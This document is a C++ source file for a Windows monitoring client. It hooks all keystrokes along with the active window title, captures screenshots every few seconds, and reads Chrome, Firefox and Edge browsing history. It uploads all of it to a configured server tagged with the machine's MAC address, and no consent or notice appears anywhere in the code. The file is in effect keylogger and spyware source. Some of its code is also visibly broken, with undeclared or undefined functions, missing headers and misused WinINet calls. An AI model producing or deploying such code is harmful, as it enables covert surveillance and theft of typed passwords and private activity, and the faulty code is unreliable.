#include <windows.h>
#include <wininet.h>
#include <gdiplus.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <setupapi.h>
#include <devguid.h>
#include <regstr.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <json/json.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <map>
#include <mutex>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "sqlite3.lib")

#define SCREEN_INTERVAL 5
#define TIC_INTERVAL 30
#define HISTORY_INTERVAL 120
#define KEY_INTERVAL 60
#define STORAGE_CHECK_INTERVAL 5

// Global variables
std::string macAddress;
int screenInterval = SCREEN_INTERVAL;
double lastBrowserTic = -1;
bool activeRunning = true;
std::vector<Json::Value> keyLogs;
std::vector<Json::Value> usbDeviceLogs;
std::vector<Json::Value> browserHistories;
std::mutex dataMutex;
HHOOK keyboardHook = NULL;
HHOOK mouseHook = NULL;

// Configuration
std::string API_BASE_URL = "http://localhost/scview";
std::string API_ROUTE = "/webapi.php";
std::string TIC_ROUTE = "/eventhandler.php";
std::string APP_VERSION = "1.0";

// Structure for browser history
struct BrowserHistoryEntry {
    std::string date;
    std::string url;
    std::string title;
};

// Structure for key log
struct KeyLogEntry {
    std::string date;
    std::string application;
    std::string key;
};

// Structure for USB device log
struct USBDeviceEntry {
    std::string date;
    std::string device;
    std::string action;
};

// Function declarations
std::string getMacAddress();
std::string getCurrentDateTimeString();
std::string getActiveWindowTitle();
std::string getKeyName(DWORD vkCode, DWORD scanCode, DWORD flags);
void takeScreenshot(const std::string& filePath);
bool sendScreenshot(const std::string& filePath);
bool sendTicEvent();
bool sendBrowserHistories();
bool sendKeyLogs();
bool sendUSBLogs();
void collectBrowserHistory();
void setupKeyboardHook();
void removeKeyboardHook();
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
void setupUSBMONITORING();
void cleanupUSBMONITORING();
std::string httpPost(const std::string& url, const std::string& data);
std::string httpPostFile(const std::string& url, const std::string& filePath);
std::string getChromeHistory();
std::string getFirefoxHistory();
std::string getEdgeHistory();
void monitorTask();

// Get MAC address
std::string getMacAddress() {
    std::string macAddress;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    
    if (pAdapterInfo == NULL) {
        return "";
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            if (pAdapter->Type == MIB_IF_TYPE_ETHERNET) {
                char mac[18];
                sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
                    pAdapter->Address[0], pAdapter->Address[1],
                    pAdapter->Address[2], pAdapter->Address[3],
                    pAdapter->Address[4], pAdapter->Address[5]);
                macAddress = std::string(mac);
                break;
            }
            pAdapter = pAdapter->Next;
        }
    }
    
    free(pAdapterInfo);
    return macAddress;
}

// Get current date time string
std::string getCurrentDateTimeString() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

// Get active window title
std::string getActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (hwnd == NULL) return "Unknown";
    
    char windowTitle[256];
    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
    
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);
    
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess != NULL) {
        char processName[MAX_PATH];
        if (GetModuleBaseNameA(hProcess, NULL, processName, sizeof(processName)) > 0) {
            CloseHandle(hProcess);
            return std::string(processName) + " (" + std::string(windowTitle) + ")";
        }
        CloseHandle(hProcess);
    }
    
    return std::string(windowTitle);
}

// Get key name from virtual key code
std::string getKeyName(DWORD vkCode, DWORD scanCode, DWORD flags) {
    char keyName[256];
    UINT scanCodeMap = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    
    if (GetKeyNameTextA(scanCodeMap << 16, keyName, sizeof(keyName)) > 0) {
        return std::string(keyName);
    }
    
    // Fallback for common keys
    switch (vkCode) {
        case VK_RETURN: return "Enter";
        case VK_ESCAPE: return "Escape";
        case VK_TAB: return "Tab";
        case VK_SPACE: return "Space";
        case VK_BACK: return "Backspace";
        case VK_DELETE: return "Delete";
        case VK_INSERT: return "Insert";
        case VK_HOME: return "Home";
        case VK_END: return "End";
        case VK_PRIOR: return "Page Up";
        case VK_NEXT: return "Page Down";
        case VK_LEFT: return "Left";
        case VK_RIGHT: return "Right";
        case VK_UP: return "Up";
        case VK_DOWN: return "Down";
        case VK_F1: return "F1";
        case VK_F2: return "F2";
        case VK_F3: return "F3";
        case VK_F4: return "F4";
        case VK_F5: return "F5";
        case VK_F6: return "F6";
        case VK_F7: return "F7";
        case VK_F8: return "F8";
        case VK_F9: return "F9";
        case VK_F10: return "F10";
        case VK_F11: return "F11";
        case VK_F12: return "F12";
        default: return "Key" + std::to_string(vkCode);
    }
}

// Take screenshot
void takeScreenshot(const std::string& filePath) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMemory = CreateCompatibleDC(hdcScreen);
    
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMemory, hbmScreen);
    
    BitBlt(hdcMemory, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    
    // Save to file using GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromHBITMAP(hbmScreen, NULL);
    CLSID pngClsid;
    GetEncoderClsid(L"image/png", &pngClsid);
    
    std::wstring wFilePath(filePath.begin(), filePath.end());
    bmp->Save(wFilePath.c_str(), &pngClsid, NULL);
    
    delete bmp;
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    SelectObject(hdcMemory, hbmOld);
    DeleteObject(hbmScreen);
    DeleteDC(hdcMemory);
    ReleaseDC(NULL, hdcScreen);
}

// Get encoder CLSID for image format
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}

// Send screenshot to server
bool sendScreenshot(const std::string& filePath) {
    std::string url = API_BASE_URL + API_ROUTE;
    std::string response = httpPostFile(url, filePath);
    
    // Parse response
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            if (root.isMember("Interval")) {
                screenInterval = root["Interval"].asInt();
            }
            return true;
        }
    }
    
    return false;
}

// Send tic event
bool sendTicEvent() {
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "Tic";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            if (root.isMember("LastBrowserTic")) {
                lastBrowserTic = root["LastBrowserTic"].asDouble();
            }
            return true;
        }
    }
    
    return false;
}

// Send browser histories
bool sendBrowserHistories() {
    if (browserHistories.empty()) return true;
    
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "BrowserHistory";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["BrowserHistories"] = Json::Value(Json::arrayValue);
    
    for (const auto& history : browserHistories) {
        data["BrowserHistories"].append(history);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            std::lock_guard<std::mutex> lock(dataMutex);
            browserHistories.clear();
            return true;
        }
    }
    
    return false;
}

// Send key logs
bool sendKeyLogs() {
    if (keyLogs.empty()) return true;
    
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "KeyLog";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["KeyLogs"] = Json::Value(Json::arrayValue);
    
    for (const auto& keyLog : keyLogs) {
        data["KeyLogs"].append(keyLog);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            std::lock_guard<std::mutex> lock(dataMutex);
            keyLogs.clear();
            return true;
        }
    }
    
    return false;
}

// Send USB logs
bool sendUSBLogs() {
    if (usbDeviceLogs.empty()) return true;
    
    std::string url = API_BASE_URL + TIC_ROUTE;
    
    Json::Value data;
    data["Event"] = "USBLog";
    data["Version"] = APP_VERSION;
    data["MacAddress"] = macAddress;
    data["USBLogs"] = Json::Value(Json::arrayValue);
    
    for (const auto& usbLog : usbDeviceLogs) {
        data["USBLogs"].append(usbLog);
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(data);
    
    std::string response = httpPost(url, jsonData);
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            std::lock_guard<std::mutex> lock(dataMutex);
            usbDeviceLogs.clear();
            return true;
        }
    }
    
    return false;
}

// HTTP POST request
std::string httpPost(const std::string& url, const std::string& data) {
    HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Set headers
    std::string headers = "Content-Type: application/json\r\n";
    HttpAddRequestHeadersA(hConnect, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
    
    // Send request
    BOOL result = HttpSendRequestA(hConnect, NULL, 0, (LPVOID)data.c_str(), data.length());
    
    std::string response;
    if (result) {
        char buffer[1024];
        DWORD bytesRead;
        while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return response;
}

// HTTP POST file upload
std::string httpPostFile(const std::string& url, const std::string& filePath) {
    HINTERNET hInternet = InternetOpenA("MonitorClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Read file
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }
    
    std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    // Create multipart form data
    std::string boundary = "----WebKitFormBoundary" + std::to_string(GetTickCount());
    std::string contentType = "multipart/form-data; boundary=" + boundary;
    
    std::string formData = "--" + boundary + "\r\n";
    formData += "Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"" + filePath + "\"\r\n";
    formData += "Content-Type: image/png\r\n\r\n";
    formData += fileContent + "\r\n";
    formData += "--" + boundary + "--\r\n";
    
    // Set headers
    std::string headers = "Content-Type: " + contentType + "\r\n";
    HttpAddRequestHeadersA(hConnect, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
    
    // Send request
    BOOL result = HttpSendRequestA(hConnect, NULL, 0, (LPVOID)formData.c_str(), formData.length());
    
    std::string response;
    if (result) {
        char buffer[1024];
        DWORD bytesRead;
        while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return response;
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
            
            std::string application = getActiveWindowTitle();
            std::string keyName = getKeyName(kbStruct->vkCode, kbStruct->scanCode, kbStruct->flags);
            std::string timestamp = getCurrentDateTimeString();
            
            // Check for modifier keys
            std::string modifiers;
            if (GetAsyncKeyState(VK_CONTROL) & 0x8000) modifiers += "Ctrl+";
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) modifiers += "Shift+";
            if (GetAsyncKeyState(VK_MENU) & 0x8000) modifiers += "Alt+";
            if (GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000) modifiers += "Win+";
            
            std::string fullKeyName = modifiers + keyName;
            
            Json::Value keyLog;
            keyLog["date"] = timestamp;
            keyLog["application"] = application;
            keyLog["key"] = fullKeyName;
            
            std::lock_guard<std::mutex> lock(dataMutex);
            keyLogs.push_back(keyLog);
        }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Setup keyboard hook
void setupKeyboardHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        std::cerr << "Failed to set keyboard hook" << std::endl;
    }
}

// Remove keyboard hook
void removeKeyboardHook() {
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }
}

// Collect browser history
void collectBrowserHistory() {
    // Chrome history
    std::string chromeHistory = getChromeHistory();
    if (!chromeHistory.empty()) {
        Json::Value history;
        history["browser"] = "Chrome";
        history["data"] = chromeHistory;
        history["date"] = getCurrentDateTimeString();
        
        std::lock_guard<std::mutex> lock(dataMutex);
        browserHistories.push_back(history);
    }
    
    // Firefox history
    std::string firefoxHistory = getFirefoxHistory();
    if (!firefoxHistory.empty()) {
        Json::Value history;
        history["browser"] = "Firefox";
        history["data"] = firefoxHistory;
        history["date"] = getCurrentDateTimeString();
        
        std::lock_guard<std::mutex> lock(dataMutex);
        browserHistories.push_back(history);
    }
    
    // Edge history
    std::string edgeHistory = getEdgeHistory();
    if (!edgeHistory.empty()) {
        Json::Value history;
        history["browser"] = "Edge";
        history["data"] = edgeHistory;
        history["date"] = getCurrentDateTimeString();
        
        std::lock_guard<std::mutex> lock(dataMutex);
        browserHistories.push_back(history);
    }
}

// Get Chrome history
std::string getChromeHistory() {
    char* localAppData;
    size_t len;
    _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
    if (!localAppData) return "";
    
    std::string chromePath = std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default\\History";
    free(localAppData);
    
    sqlite3* db;
    if (sqlite3_open(chromePath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            entry["url"] = (char*)sqlite3_column_text(stmt, 0);
            entry["title"] = (char*)sqlite3_column_text(stmt, 1);
            entry["last_visit"] = sqlite3_column_int64(stmt, 2);
            historyArray.append(entry);
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Get Firefox history
std::string getFirefoxHistory() {
    char* appData;
    size_t len;
    _dupenv_s(&appData, &len, "APPDATA");
    if (!appData) return "";
    
    std::string firefoxPath = std::string(appData) + "\\Mozilla\\Firefox\\Profiles";
    free(appData);
    
    // Find default profile
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((firefoxPath + "\\*.default*").c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return "";
    
    std::string profilePath = firefoxPath + "\\" + findData.cFileName + "\\places.sqlite";
    FindClose(hFind);
    
    sqlite3* db;
    if (sqlite3_open(profilePath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 100";
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            entry["url"] = (char*)sqlite3_column_text(stmt, 0);
            entry["title"] = (char*)sqlite3_column_text(stmt, 1);
            entry["last_visit"] = sqlite3_column_int64(stmt, 2);
            historyArray.append(entry);
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Get Edge history
std::string getEdgeHistory() {
    char* localAppData;
    size_t len;
    _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
    if (!localAppData) return "";
    
    std::string edgePath = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default\\History";
    free(localAppData);
    
    sqlite3* db;
    if (sqlite3_open(edgePath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            entry["url"] = (char*)sqlite3_column_text(stmt, 0);
            entry["title"] = (char*)sqlite3_column_text(stmt, 1);
            entry["last_visit"] = sqlite3_column_int64(stmt, 2);
            historyArray.append(entry);
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Main monitoring task
void monitorTask() {
    auto lastScreenshot = std::chrono::steady_clock::now();
    auto lastTic = std::chrono::steady_clock::now();
    auto lastHistory = std::chrono::steady_clock::now();
    auto lastKeyLog = std::chrono::steady_clock::now();
    
    while (activeRunning) {
        auto now = std::chrono::steady_clock::now();
        
        // Screenshot
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastScreenshot).count() >= screenInterval) {
            std::string timestamp = getCurrentDateTimeString();
            std::replace(timestamp.begin(), timestamp.end(), ':', '-');
            std::replace(timestamp.begin(), timestamp.end(), ' ', '_');
            
            std::string screenshotPath = "screenshot_" + timestamp + ".png";
            takeScreenshot(screenshotPath);
            sendScreenshot(screenshotPath);
            
            lastScreenshot = now;
        }
        
        // Tic event
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastTic).count() >= TIC_INTERVAL) {
            sendTicEvent();
            lastTic = now;
        }
        
        // Browser history
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastHistory).count() >= HISTORY_INTERVAL) {
            collectBrowserHistory();
            sendBrowserHistories();
            lastHistory = now;
        }
        
        // Key logs
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastKeyLog).count() >= KEY_INTERVAL) {
            sendKeyLogs();
            lastKeyLog = now;
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

// Main function
int main() {
    // Initialize COM for GDI+
    CoInitialize(NULL);
    
    // Get MAC address
    macAddress = getMacAddress();
    if (macAddress.empty()) {
        std::cerr << "Warning: Could not get MAC address" << std::endl;
    }
    
    // Setup keyboard monitoring
    setupKeyboardHook();
    
    // Start monitoring thread
    std::thread monitorThread(monitorTask);
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    activeRunning = false;
    monitorThread.join();
    removeKeyboardHook();
    CoUninitialize();
    
    return 0;
} 